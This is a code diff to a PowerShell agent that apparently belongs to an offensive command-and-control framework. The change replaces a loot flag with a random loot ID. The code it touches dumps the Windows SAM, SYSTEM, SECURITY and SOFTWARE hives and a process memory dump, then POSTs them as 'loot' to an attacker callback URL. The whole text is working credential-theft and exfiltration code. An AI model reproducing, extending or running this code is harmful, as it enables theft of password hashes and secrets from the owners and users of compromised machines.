@@ -415,7 +415,7 @@ function Send-File {
        [String[]]$FileName,
 
        [Parameter(Mandatory=$False)]
-       [Switch] $IsLoot
+       [String] $LootId
     )
 
     if ($FileName) {
@@ -442,7 +442,7 @@ function Send-File {
     $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
     $post_url = $($CALLBACK_URL + "u?noredirect=1")
-    if ($IsLoot) { $post_url += "&loot=1" }
+    if ($LootId) { $post_url += "&loot=$LootId" }
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
     $WebRequest = [System.Net.WebRequest]::Create($post_url)
     $WebRequest.Method = "POST"
@@ -488,7 +488,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
        [String[]]$Name,
 
        [Parameter(Mandatory=$false)]
-       [Switch] $IsLoot,
+       [String] $LootId,
 
        [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
        $Stream
@@ -518,8 +518,8 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 if ($Name) { $filename = $name } else { $filename = $file }
 
-                if ($IsLoot) {
-                    Send-File -IsLoot $fileBin $filename
+                if ($LootId) {
+                    Send-File -LootId $LootId $fileBin $filename
                 } else {
                     Send-File $fileBin $filename
                 }
@@ -595,6 +595,9 @@ Partially based on:
     Author: Matthew Graeber (@mattifestation)
     License: BSD 3-Clause
 #>
+    $LootId = ""
+    1..4 | %{ $LootId += '{0:x}' -f (Get-Random -Max 256) }
+
 
     $SamPath = Join-Path $env:TMP "sam"
     $SystemPath = Join-Path $env:TMP "system"
@@ -632,7 +635,7 @@ Partially based on:
         $FileStream.Close()
 
         Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
-            if (Test-Path $f) { PushTo-Hub -IsLoot $f }
+            if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
         }
     } finally {
         Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
